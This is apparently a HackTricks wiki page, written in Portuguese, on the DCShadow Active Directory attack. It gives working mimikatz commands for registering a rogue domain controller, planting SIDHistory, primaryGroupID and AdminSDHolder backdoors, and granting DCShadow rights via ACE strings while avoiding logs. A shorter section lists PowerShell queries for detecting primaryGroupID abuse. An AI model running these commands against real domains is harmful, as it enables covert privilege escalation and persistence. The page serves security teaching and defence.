# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Informações Básicas

Registra um **novo Domain Controller** no AD e o usa para **push attributes** (SIDHistory, SPNs...) em objetos especificados **sem** deixar quaisquer **logs** sobre as **modificações**. Você **precisa de DA** privilégios e deve estar dentro do **root domain**.\
Observe que, se você usar dados incorretos, logs bem feios aparecerão.

Para realizar o ataque você precisa de 2 instâncias do mimikatz. Uma delas iniciará os servidores RPC com privilégios SYSTEM (você deve indicar aqui as mudanças que deseja executar), e a outra instância será usada para push the values:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Observe que **`elevate::token`** não funcionará na sessão `mimikatz1`, pois isso elevava os privilégios da thread, mas precisamos elevar o **privilégio do processo**.\
Você também pode selecionar um objeto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Você pode enviar as alterações a partir de um DA ou de um usuário com as seguintes permissões mínimas:

- No **objeto de domínio**:
- _DS-Install-Replica_ (Adicionar/Remover réplica no domínio)
- _DS-Replication-Manage-Topology_ (Gerenciar topologia de replicação)
- _DS-Replication-Synchronize_ (Sincronização de replicação)
- O **objeto Sites** (e seus filhos) no **Configuration container**:
- _CreateChild and DeleteChild_
- O objeto do **computador que está registrado como um DC**:
- _WriteProperty_ (Not Write)
- O **objeto alvo**:
- _WriteProperty_ (Not Write)

Você pode usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para conceder esses privilégios a um usuário sem privilégios (observe que isso deixará alguns logs). Isto é muito mais restritivo do que ter privilégios de DA.\
Por exemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Isso significa que o nome de usuário _**student1**_ quando conectado na máquina _**mcorp-student1**_ tem permissões de DCShadow sobre o objeto _**root1user**_.

## Usando DCShadow para criar backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Abuso de grupo primário, lacunas de enumeração e detecção

- `primaryGroupID` é um atributo separado da lista `member` do grupo. DCShadow/DSInternals podem escrevê-lo diretamente (ex.: setar `primaryGroupID=512` para **Domain Admins**) sem a aplicação do LSASS no host, mas o AD ainda **move** o usuário: alterar o PGID sempre remove a associação do grupo primário anterior (mesmo comportamento para qualquer grupo alvo), portanto você não pode manter a associação ao antigo grupo primário.
- Ferramentas padrão impedem remover um usuário do seu grupo primário atual (`ADUC`, `Remove-ADGroupMember`), então alterar o PGID normalmente requer gravações diretas no diretório (DCShadow/`Set-ADDBPrimaryGroup`).
- Relatórios de associação são inconsistentes:
- **Inclui** membros derivados do grupo primário: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Omite** membros derivados do grupo primário: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspecionando `member`, `Get-ADUser <user> -Properties memberOf`.
- Verificações recursivas podem não encontrar membros do grupo primário se o **grupo primário estiver aninhado** (p.ex., PGID do usuário aponta para um grupo aninhado dentro de Domain Admins); `Get-ADGroupMember -Recursive` ou filtros recursivos LDAP não retornarão esse usuário a menos que a recursão resolva explicitamente grupos primários.
- Truques com DACL: atacantes podem **deny ReadProperty** em `primaryGroupID` no usuário (ou no atributo `member` do grupo para grupos não protegidos por AdminSDHolder), ocultando a associação efetiva da maioria das consultas PowerShell; `net group` ainda resolverá a associação. Grupos protegidos por AdminSDHolder irão resetar tais negações.

Detection/monitoring examples:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Verifique grupos privilegiados comparando a saída de `Get-ADGroupMember` com `Get-ADGroup -Properties member` ou ADSI Edit para detectar discrepâncias introduzidas por `primaryGroupID` ou atributos ocultos.

## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)

Precisamos acrescentar as seguintes ACEs com o SID do nosso usuário no final:

- On the domain object:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- On the attacker computer object: `(A;;WP;;;UserSID)`
- On the target user object: `(A;;WP;;;UserSID)`
- On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`

Para obter a ACE atual de um objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Repare que, nesse caso, você precisa fazer **várias alterações,** não apenas uma. Portanto, na **sessão mimikatz1** (RPC server) use o parâmetro **`/stack` com cada alteração** que quiser fazer. Dessa forma, você precisará apenas do **`/push`** uma vez para aplicar todas as alterações acumuladas no rouge server.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## Referências

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
